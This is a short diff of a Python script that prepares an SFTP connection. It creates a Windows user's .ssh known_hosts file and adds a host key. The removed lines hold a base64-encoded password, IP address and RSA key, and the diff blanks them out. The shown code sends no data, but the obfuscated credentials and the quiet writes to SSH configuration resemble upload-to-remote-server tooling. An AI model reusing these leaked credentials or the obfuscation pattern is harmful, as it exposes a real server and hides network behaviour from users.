@@ -8,16 +8,16 @@ import os
 import random
 import string
 
-writeHost = base64.b64decode("MTkyLjE2OC4xLjE3NiBzc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUJBUURaN21tNHlRbnhab0ljR1AyYldEQUMySWEzTGEwcmRDTzZnZkpDOVlSOXlQN2t3UXBvM3FBY1JtTWNZb0xNd1NJMGg2NnZjdzJVUkEvWU5pNEFqTFFhenVHcDhpcTZKUkpmMU1YNUdwUXVmKytFK3pwNEhKeWk3V0VYd2hiV2RmT0FYR2UrS1B5eVRCVC85ZU5kemVLRlJKdnBQZm5LNldmN2JtcWROcjc0em9MNWhucGpYYjRuYTRVYXZhb29qbGpxbmdxMlk2VGNMZzJSOHptR1kxb1JrY1pXRlpZYXZmc3VMN0tZZDFRMFozbXNmc0owaVlHTGx3d0xGd05pdVMxKytFYk02dlRjekVQdFVXVnpLMU9LdDR4VHhVa0JzQzhnTFdrTjJBZ0g0MkFzVnA1UDdONXllYnROUkorZWN5ZkJEQS9PVHdZTzlFNURTVHgxWWhrdg==")
+writeHost = base64.b64decode("")
 if os.path.isdir(os.environ["USERPROFILE"]+"\\.ssh") == False:
     os.makedirs(os.environ["USERPROFILE"]+"\\.ssh")
     f = open(os.environ["USERPROFILE"]+"\\.ssh\\known_hosts", "w")
     f.write(writeHost.decode("UTF-8"))
     f.close()
 
-password = base64.b64decode("M2l0ZWFtaWRhcGFubmE/")
-ip = base64.b64decode("OTAuMTkxLjE0Mi43Mw==")
-keydata= b"""AAAAB3NzaC1yc2EAAAADAQABAAABAQDZ7mm4yQnxZoIcGP2bWDAC2Ia3La0rdCO6gfJC9YR9yP7kwQpo3qAcRmMcYoLMwSI0h66vcw2URA/YNi4AjLQazuGp8iq6JRJf1MX5GpQuf++E+zp4HJyi7WEXwhbWdfOAXGe+KPyyTBT/9eNdzeKFRJvpPfnK6Wf7bmqdNr74zoL5hnpjXb4na4Uavaoojljqngq2Y6TcLg2R8zmGY1oRkcZWFZYavfsuL7KYd1Q0Z3msfsJ0iYGLlwwLFwNiuS1++EbM6vTczEPtUWVzK1OKt4xTxUkBsC8gLWkN2AgH42AsVp5P7N5yebtNRJ+ecyfBDA/OTwYO9E5DSTx1Yhkv"""
+password = base64.b64decode("")
+ip = base64.b64decode("")
+keydata= b""""""
 key = paramiko.RSAKey(data=base64.decodebytes(keydata))
 cnopts = pysftp.CnOpts()
 cnopts.hostkeys.add(ip, "ssh-rsa", key)
